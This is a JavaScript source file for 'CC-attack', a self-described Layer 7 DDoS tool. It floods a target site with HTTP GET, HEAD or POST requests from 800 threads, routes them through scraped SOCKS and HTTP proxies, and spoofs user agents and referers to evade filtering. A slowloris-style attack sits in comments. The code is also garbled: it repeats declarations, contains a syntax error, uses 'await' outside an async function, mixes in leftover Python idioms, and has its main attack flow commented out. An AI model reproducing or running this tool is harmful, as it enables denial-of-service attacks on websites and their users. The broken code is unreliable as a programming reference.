#!/usr/bin/env node
const http = require('http');
const https = require('https');
const socks = require('socks');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const url = require('url');
const yargs = require('yargs');
const tls = require('tls');
const net = require('net');
const fs = require('fs');
const readline = require('readline');


console.log(`
	   /////    /////    /////////////
	  CCCCC/   CCCCC/   | CC-attack |/
	 CC/      CC/       |-----------|/
	 CC/      CC/       |  Layer 7  |/
	 CC/////  CC/////   | ddos tool |/
	  CCCCC/   CCCCC/   |___________|/
>--------------------------------------------->
Version 3.7.1 (2022/3/24)
                              C0d3d by L330n123
┌──────────────────────────────────────────────┐
│        Tos: Don't attack .gov website        │
├──────────────────────────────────────────────┤
│                 New stuff:                   │
│          [+] Added Http Proxy Support        │
│          [+] Optimization                    │
│          [+] Changed Varible Name            │
├──────────────────────────────────────────────┤
│ Link: https://github.com/eymeen/CC-attack-js │
└──────────────────────────────────────────────┘`)

const http = require('http');
const https = require('https');
const socks = require('socks');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const url = require('url');

const acceptall = [
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept-Encoding: gzip, deflate\r\n",
    "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
    "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
    "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,",
    "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
    "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
    "Accept: text/html, application/xhtml+xml",
    "Accept-Language: en-US,en;q=0.5\r\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
    "Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"
];

const referers = [
    "https://www.google.com/search?q=",
    "https://check-host.net/",
    "https://www.facebook.com/",
    "https://www.youtube.com/",
    "https://www.fbi.com/",
    "https://www.bing.com/search?q=",
    "https://r.search.yahoo.com/",
    "https://www.cia.gov/index.html",
    "https://vk.com/profile.php?redirect=",
    "https://www.usatoday.com/search/results?q=",
    "https://help.baidu.com/searchResult?keywords=",
    "https://steamcommunity.com/market/search?q=",
    "https://www.ted.com/search?q=",
    "https://play.google.com/store/search?q=",
    "https://www.qwant.com/search?q=",
    "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
    "https://www.google.ad/search?q=",
    "https://www.google.ae/search?q=",
    "https://www.google.com.af/search?q=",
    "https://www.google.com.ag/search?q=",
    "https://www.google.com.ai/search?q=",
    "https://www.google.al/search?q=",
    "https://www.google.am/search?q=",
    "https://www.google.co.ao/search?q=",
]


const http = require('http');
const https = require('https');
const fs = require('fs');
const url = require('url');
const crypto = require('crypto');
const querystring = require('querystring');
const events = require('events');
const random = require('random');

const mode = "cc";
const url = "";
const proxy_ver = "5";
const brute = false;
const out_file = "proxy.txt";
const thread_num = 800;
const data = "";
const cookies = "";

const strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&";

const Intn = random.int;
const Choice = random.choice;

function buildThreads(mode, threadNum, event, proxyType) {
    if (mode === "post") {
        for (let i = 0; i < threadNum; i++) {
            const th = new Thread(() => post(event, proxyType));
            th.daemon = true;
            th.start();
        }
    } else if (mode === "cc") {
        for (let i = 0; i < threadNum; i++) {
            const th = new Thread(() => cc(event, proxyType));
            th.daemon = true;
            th.start();
        }
    } else if (mode === "head") {
        for (let i = 0; i < threadNum; i++) {
            const th = new Thread(() => head(event, proxyType));
            th.daemon = true;
            th.start();
        }
    }
}

function getUserAgent() {
    const platform = Choice(['Macintosh', 'Windows', 'X11']);
    let os;
    if (platform === 'Macintosh') {
        os = Choice(['68K', 'PPC', 'Intel Mac OS X']);
    } else if (platform === 'Windows') {
        os = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64']);
    } else if (platform === 'X11') {
        os = Choice(['Linux i686', 'Linux x86_64']);
    }
    const browser = Choice(['chrome', 'firefox', 'ie']);
    if (browser === 'chrome') {
        const webkit = Intn(500, 599).toString();
        const version = Intn(0, 99) + '.0' + Intn(0, 9999) + '.' + Intn(0, 999);
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit;
    } else if (browser === 'firefox') {
        const currentYear = new Date().getFullYear();
        const year = Intn(2020, currentYear).toString();
        let month = Intn(1, 12);
        if (month < 10) {
            month = '0' + month.toString();
        } else {
            month = month.toString();
        }
        let day = Intn(1, 30);
        if (day < 10) {
            day = '0' + day.toString();
        } else {
            day = day.toString();
        }
        const gecko = year + month + day;
        const version = Intn(1, 72) + '.0';
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version;
    } else if (browser === 'ie') {
        const version = Intn(1, 99) + '.0';
        const engine = Intn(1, 99) + '.0';
        const option = Choice([true, false]);
        let token = '';
        if (option === true) {
            token = Choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; ';
        }
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')';
    }
}

function randomUrl() {
    return Intn(0, 271400281257).toString(); // less random, more performance
}

function genReqHeader(method) {
    let header = '';
    if (method === 'get' || method === 'head') {
        const connection = "Connection: Keep-Alive\r\n";
        const accept = Choice(acceptall);
        const referer = "Referer: " + Choice(referers) + target + path + "\r\n";
        const useragent = "User-Agent: " + getUserAgent() + "\r\n";
        header = referer + useragent + accept + connection + "\r\n";
    } else if (method === 'post') {
        const postHost = "POST " + path + " HTTP/1.1\r\nHost: " + target + "\r\n";
        const content = "Content-Type: application/x-www-form-urlencoded\r\nX-requested-with:XMLHttpRequest\r\n";
        const refer = "Referer: http://" + target + path + "\r\n";
        const userAgent = "User-Agent: " + getUserAgent() + "\r\n";
        const accept = Choice(acceptall);
        if (data === "") {
            data = crypto.randomBytes(16).toString('hex');
        }
        const length = "Content-Length: " + data.length + " \r\nConnection: Keep-Alive\r\n";
        header = postHost + accept + refer + content + userAgent + length + "\n" + data + "\r\n\r\n";
    }
    return header;
}

function parseUrl(originalUrl) {
    originalUrl = originalUrl.trim();
    const parsedUrl = url.parse(originalUrl);
    url = "";
    path = "/";
    port = 80;
    protocol = "http";

    if (parsedUrl.protocol === "http:") {
        url = originalUrl.slice(7);
    } else if (parsedUrl.protocol === "https:") {
        url = originalUrl.slice(8);
        protocol = "https";
    } else {
        console.log("That looks like not a correct URL.");
        process.exit();
    }

    const parts = url.split("/");
    website = parts[0];

    const check = website.split(":");
    if (check.length > 1) {
        port = parseInt(check[1]);
    }

    target = check[0];

    if (parts.length > 1) {
        path = url.replace(website, "");
    }
}
const readline = require('readline');
const socks = require('socks');
const tls = require('tls');
const net = require('net');
const crypto = require('crypto');
const fs = require('fs');
const http = require('http');
const https = require('https');

function InputOption(question, options, defaultVal) {
  let ans = "";
  while (ans === "") {
    ans = readline.question(question).trim().toLowerCase();
    if (ans === "") {
      ans = defaultVal;
    } else if (!options.includes(ans)) {
      console.log("> Please enter the correct option");
      ans = "";
      continue;
    }
  }
  return ans;
}

function cc(event, proxyType) {
  const header = GenReqHeader("get");
  const proxy = Choice(proxies).trim().split(":");
  let add = "?";
  if (path.includes("?")) {
    add = "&";
  }
  event.wait();
  while (true) {
    try {
      const s = new socks.SocksClient();
      if (proxyType === 4) {
        s.setProxy(socks.createConnection, {
          proxy: {
            ipaddress: proxy[0],
            port: proxy[1],
            type: 4
          }
        });
      } else if (proxyType === 5) {
        s.setProxy(socks.createConnection, {
          proxy: {
            ipaddress: proxy[0],
            port: proxy[1],
            type: 5
          }
        });
      } else if (proxyType === 0) {
        s.setProxy(socks.createConnection, {
          proxy: {
            ipaddress: proxy[0],
            port: proxy[1],
            type: 0
          }
        });
      }
      if (brute) {
        s.setNoDelay(true);
      }
      s.setTimeout(3000);
      s.connect({
        host: target,
        port: port
      });
      if (protocol === "https") {
        const ctx = tls.createSecureContext();
        s.upgradeConnection(ctx);
      }
      for (let i = 0; i < 100; i++) {
        const getHost = `GET ${path}${add}${randomurl()} HTTP/1.1\r\nHost: ${target}\r\n`;
        const request = getHost + header;
        const sent = s.write(request, 'utf8');
        if (!sent) {
          proxy = Choice(proxies).trim().split(":");
          break;
        }
      }
      s.destroy();
    } catch (error) {
      s.destroy();
    }
  }
}

function head(event, proxyType) {
  const header = GenReqHeader("head");
  const proxy = Choice(proxies).trim().split(":");
  let add = "?";
  if (path.includes("?")) {
    add = "&";
  }
  event.wait();
  while (true) {
    try {
      const s = new socks.SocksClient();
      if (proxyType === 4) {
        s.setProxy(socks.createConnection, {
          proxy: {
            ipaddress: proxy[0],
            port: proxy[1],
            type: 4
          }
        });
      } else if (proxyType === 5) {
        s.setProxy(socks.createConnection, {
          proxy: {
            ipaddress: proxy[0],
            port: proxy[1],
            type: 5
          }
        });
      } else if (proxyType === 0) {
        s.setProxy(socks.createConnection, {
          proxy: {
            ipaddress: proxy[0],
            port: proxy[1],
            type: 0
          }
        });
      }
      if (brute) {
        s.setNoDelay(true);
      }
      s.setTimeout(3000);
      s.connect({
        host: target,
        port: port
      });
      if (protocol === "https") {
        const ctx = tls.createSecureContext();
        s.upgradeConnection(ctx);
      }
      for (let i = 0; i < 100; i++) {
        const headHost = `HEAD ${path}${add}${randomurl()} HTTP/1.1\r\nHost: ${target}\r\n`;
        const request = headHost + header;
        const sent = s.write(request, 'utf8');
        if (!sent) {
          proxy = Choice(proxies).trim().split(":");
          break;
        }
      }
      s.destroy();
    } catch (error) {
      s.destroy();
    }
  }
}

function post(event, proxyType) {
  const request = GenReqHeader("post");
  const proxy = Choice(proxies).trim().split(":");
  event.wait();
  while (true) {
    try {
      const s = new socks.SocksClient();
      if (proxyType === 4) {
        s.setProxy(socks.createConnection, {
          proxy: {
            ipaddress: proxy[0],
            port: proxy[1],
            type: 4
          }
        });
      } else if (proxyType === 5) {
        s.setProxy(socks.createConnection, {
          proxy: {
            ipaddress: proxy[0],
            port: proxy[1],
            type: 5
          }
        });
      } else if (proxyType === 0) {
        s.setProxy(socks.createConnection, {
          proxy: {
            ipaddress: proxy[0],
            port: proxy[1],
            type: 0
          }
        });
      }
      if (brute) {
        s.setNoDelay(true);
      }
      s.setTimeout(3000);
      s.connect({
        host: target,
        port: port
      });
      if (protocol === "https") {
        const ctx = tls.createSecureContext();
        s.upgradeConnection(ctx);
      }
      for (let i = 0; i < 100; i++) {
        const sent = s.write(request, 'utf8');
        if (!sent) {
          proxy = Choice(proxies).trim().split(":");
          break;
        }
      }
      s.destroy();
    } catch (error) {
      s.destroy();
    }
  }
}

// function slow_atk_conn(proxyType, rlock) {
//   const socket_list = [];
//   let proxy = Choice(proxies).trim().split(":");
//   while (true) {
//     try {
//       const s = new socks.SocksClient();
//       if (proxyType === 4) {
//         s.setProxy(socks.createConnection, {
//           proxy: {
//             ipaddress: proxy[0],
//             port: proxy[1],
//             type: 4
//           }
//         });
//       } else if (proxyType === 5) {
//         s.setProxy(socks.createConnection, {
//           proxy: {
//             ipaddress: proxy[0],
//             port: proxy[1],
//             type: 5
//           }
//         });
//       } else if (proxyType === 0) {
//         s.setProxy(socks.createConnection, {
//           proxy: {
//             ipaddress: proxy[0],
//             port: proxy[1],
//             type: 0
//           }
//         });
//       }
//       s.setTimeout(3000);
//       s.connect({
//         host: target,
//         port: port
//       });
//       if (port === '443') {
//         const ctx = tls.createSecureContext();
//         s.upgradeConnection(ctx);
//       }
//       s.write(`GET /?${Intn(0, 2000)} HTTP/1.1\r\n`, 'utf8');
//       s.write(`User-Agent: ${getuseragent()}\r\n`, 'utf8');
//       s.write("Accept-language: en-US,en,q=0.5\r\n", 'utf8');
//       if (cookies !== "") {
//         s.write(`Cookies: ${cookies}\r\n`, 'utf8');
//       }
//       s.write("Connection: keep-alive\r\n", 'utf8');
//       rlock.acquire();
//       socket_list.push(s);
//       rlock.release();
//       return;
//     } catch (error) {
//       // Handle connection failed
//       s.destroy();
//       proxy = Choice(proxies).trim().split(":");
//     }
//   }
// }

// function slow(conn, proxyType) {
//   const socket_list = [];
//   const rlock = os.homedir();
//   for (let i = 0; i < conn; i++) {
//     const proxyType = i % 3;
//     slow_atk_conn(proxyType, rlock);
//   }
//   while (true) {
//     process.stdout.write(`[*] Running Slow Attack || Connections: ${socket_list.length}\r`);
//     process.stdout.flush();
//     if (socket_list.length !== 0) {
//       for (let i = socket_list.length - 1; i >= 0; i--) {
//         const s = socket_list[i];
//         try {
//           s.write(`X-a: ${Intn(1, 5000)}\r\n`, 'utf8');
//           process.stdout.write(`[*] Running Slow Attack || Connections: ${socket_list.length}\r`);
//           process.stdout.flush();
//         } catch (error) {
//           s.destroy();
//           socket_list.splice(i, 1);
//           process.stdout.write(`[*] Running Slow Attack || Connections: ${socket_list.length}\r`);
//           process.stdout.flush();
//         }
//       }
//       const proxy = Choice(proxies).trim().split(":");
//       for (let i = 0; i < conn - socket_list.length; i++) {
//         const proxyType = i % 3;
//         slow_atk_conn(proxyType, rlock);
//       }
//     } else {
//       setTimeout(() => {
//         time.sleep(0.1);
//       }, 100);
//     }
//   }
// }

let nums = 0;

function checking(lines, proxyType, ms, rlock) {
  const proxy = lines.trim().split(":");
  if (proxy.length !== 2) {
    rlock.acquire();
    proxies.remove(lines);
    rlock.release();
    return;
  }
  let err = 0;
  while (true) {
    if (err >= 3) {
      rlock.acquire();
      proxies.remove(lines);
      rlock.release();
      break;
    }
    try {
      const s = new socks.SocksClient();
      if (proxyType === 4) {
        s.setProxy(socks.SOCKS4, proxy[0], parseInt(proxy[1]));
      } else if (proxyType === 5) {
        s.setProxy(socks.SOCKS5, proxy[0], parseInt(proxy[1]));
      } else if (proxyType === 0) {
        s.setProxy(socks.HTTP, proxy[0], parseInt(proxy[1]));
      }
      s.setTimeout(ms);
      s.connect({ host: "1.1.1.1", port: 80 });
      const sent = s.send(Buffer.from("GET / HTTP/1.1\r\n\r\n", "utf8"));
      if (!sent) {
        err += 1;
      }
      s.close();
      break;
    } catch (error) {
      err += 1;
    }
  }
  nums += 1;
}

function checkSocks(ms) {
  let nums = 0;
  const threadList = [];
  const rlock = new RLock();
  for (const lines of proxies) {
    let proxyType = 0;
    if (proxyVer === "5") {
      proxyType = 5;
    } else if (proxyVer === "4") {
      proxyType = 4;
    } else if (proxyVer === "http") {
      proxyType = 0;
    }
    const th = new Thread(checking, lines, proxyType, ms, rlock);
    th.start();
    threadList.push(th);
    setTimeout(() => {
      process.stdout.write(`> Checked ${nums} proxies\r`);
      process.stdout.flush();
    }, 10);
  }
  for (const th of threadList) {
    th.join();
    process.stdout.write(`> Checked ${nums} proxies\r`);
    process.stdout.flush();
  }
  console.log("\r\n> Checked all proxies, Total Worked:" + proxies.length);
  const ans = "";
  if (ans === "y" || ans === "") {
    const fp = fs.createWriteStream(outFile, { flags: 'wb' });
    for (const lines of proxies) {
      fp.write(Buffer.from(lines, "utf8"));
    }
    fp.close();
    console.log("> They are saved in " + outFile);
  }
}

function checkList(socksFile) {
  console.log("> Checking list");
  const temp = fs.readFileSync(socksFile, 'utf8').split('\n');
  const tempSet = new Set();
  for (const i of temp) {
    if (i.includes(':') && !i.includes('#')) {
      try {
        net.isIP(i.trim().split(":")[0]); // Check valid IP v4
        tempSet.add(i);
      } catch (error) {
        // Ignore invalid IPs
      }
    }
  }
  const rfile = fs.createWriteStream(socksFile, { flags: 'wb' });
  for (const i of tempSet) {
    rfile.write(Buffer.from(i, "utf-8"));
  }
  rfile.close();
}

function downloadProxies(proxyVer) {
  if (proxyVer === "4") {
    const f = fs.createWriteStream(outFile, { flags: 'wb' });
    const socks4Api = [
      "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
      "https://openproxylist.xyz/socks4.txt",
      // Add more socks4 API URLs here
    ];
    for (const api of socks4Api) {
      try {
        const r = await axios.get(api, { timeout: 5000 });
        f.write(Buffer.from(r.data));
      } catch (error) {
        // Handle API request error
      }
    }
    f.close();
    try {
      const r = await axios.get("https://www.socks-proxy.net/", { timeout: 5000 });
      const part = r.data.split("<tbody>")[1].split("</tbody>")[0];
      const proxies = part.split("<tr><td>");
      let proxyList = "";
      for (const proxy of proxies) {
        const parts = proxy.split("</td><td>");
        if (parts.length >= 2) {
          proxyList += `${parts[0]}:${parts[1]}\n`;
        }
      }
      const fd = fs.createWriteStream(outFile, { flags: 'a' });
      fd.write(Buffer.from(proxyList, "utf8"));
      fd.close();
    } catch (error) {
      // Handle error
    }
  }

  if (proxyVer === "5") {
    const f = fs.createWriteStream(outFile, { flags: 'wb' });
    const socks5Api = [
      "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
      "https://www.proxy-list.download/api/v1/get?type=socks5",
      // Add more socks5 API URLs here
    ];
    for (const api of socks5Api) {
      try {
        const r = await axios.get(api, { timeout: 5000 });
        f.write(Buffer.from(r.data));
      } catch (error) {
        // Handle API request error
      }
    }
    f.close();
  }

  if (proxyVer === "http") {
    const f = fs.createWriteStream(outFile, { flags: 'wb' });
    const httpApi = [
      "https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
      "https://www.proxy-list.download/api/v1/get?type=http",
      // Add more HTTP API URLs here
    ];
    for (const api of httpApi) {
      try {
        const r = await axios.get(api, { timeout: 5000 });
        f.write(Buffer.from(r.data));
      } catch (error) {
        // Handle API request error
      }
    }
    f.close();
  }
  console.log(`> Have already downloaded proxies list as ${outFile}`);
}
const yargs = require('yargs');

function printHelp() {
  console.log(`===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target URL
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data data.json)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default: 5)
   -t        | set threads number (default: 800)
   -f        | set proxies file (default: proxy.txt)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default: 0)
   -s        | set attack time (default: 60)
   -down     | download proxies
   -check    | check proxies
=====================================================`);
}

function main() {
  let proxyVer = '5';
  let data = '';
  let cookies = '';
  let brute = false;
  let url = '';
  let out_file = 'proxy.txt';
  let thread_num = 800;
  let mode = 'cc';
  let target = '';
  let proxies = [];
  target = '';
  let check_proxies = false;
  let download_socks = false;
  let proxy_type = 5;
  let period = 60;
  let help = false;
  console.log("> Mode: [cc/post/head]"); // slow]")
  const argv = yargs.argv;
  if (argv.h || argv.help) {
    help = true;
  }
  if (argv.url) {
    url = argv.url;
  }
  if (argv.m || argv.mode) {
    mode = argv.m || argv.mode;
    if (!["cc", "post", "head"].includes(mode)) {
      console.log("> -m/-mode argument error");
      return;
    }
  }
  if (argv.v) {
    proxyVer = argv.v;
    if (proxyVer === "4") {
      proxy_type = 4;
    } else if (proxyVer === "5") {
      proxy_type = 5;
    } else if (proxyVer === "http") {
      proxy_type = 0;
    } else if (!["4", "5", "http"].includes(proxyVer)) {
      console.log("> -v argument error (only 4/5/http)");
      return;
    }
  }
  if (argv.b) {
    if (argv.b === "1") {
      brute = true;
    } else if (argv.b === "0") {
      brute = false;
    } else {
      console.log("> -b argument error");
      return;
    }
  }
  if (argv.t) {
    thread_num = parseInt(argv.t);
    if (isNaN(thread_num)) {
      console.log("> -t must be an integer");
      return;
    }
  }
  if (argv.cookies) {
    cookies = argv.cookies;
  }
  if (argv.data) {
    data = argv.data;
  }
  if (argv.f) {
    out_file = argv.f;
  }
  if (argv.down) {
    download_socks = true;
  }
  if (argv.check) {
    check_proxies = true;
  }
  if (argv.s) {
    period = parseInt(argv.s);
    if (isNaN(period)) {
      console.log("> -s must be an integer");
      return;
    }
  }

  if (download_socks) {
    // DownloadProxies(proxyVer);
    console.log("> Downloading proxies...");
    // Add code to download proxies here
  }

  if (proxiest out_file)) {
    console.log("Proxies file not found");
    return;
  }
  // proxies = open(out_file).readlines();
  // check_list(out_file);
  // proxies = open(out_file).readlines();
  if (proxies.length === 0) {
    console.log("> There are no more proxies. Please download a new proxies list.");
    return;
  }
  console.log("> Number Of Proxies: " + proxies.length);
  if (check_proxies) {
    // check_socks(3);
    console.log("> Checking proxies...");
    // Add code to check proxies here
  }

  // proxies = open(out_file).readlines();

  if (help) {
    printHelp();
  }

  if (target === "") {
    console.log("> There is no target. End of process ");
    return;
  }
  /*
  if (mode === "slow") {
    th = threading.Thread(target=slow,args=(thread_num,proxy_type,))
    th.daemon = True
    th.start()
  } else {
  */
  // event = threading.Event()
  console.log("> Building threads...");
  // build_threads(mode,thread_num,event,proxy_type);
  // event.clear()
  // input("Press Enter to continue.")
  // event.set()
  console.log("> Flooding...");
  // time.sleep(period)
}

if (require.main === module) {
  main(); // Coded by Leeon123
}
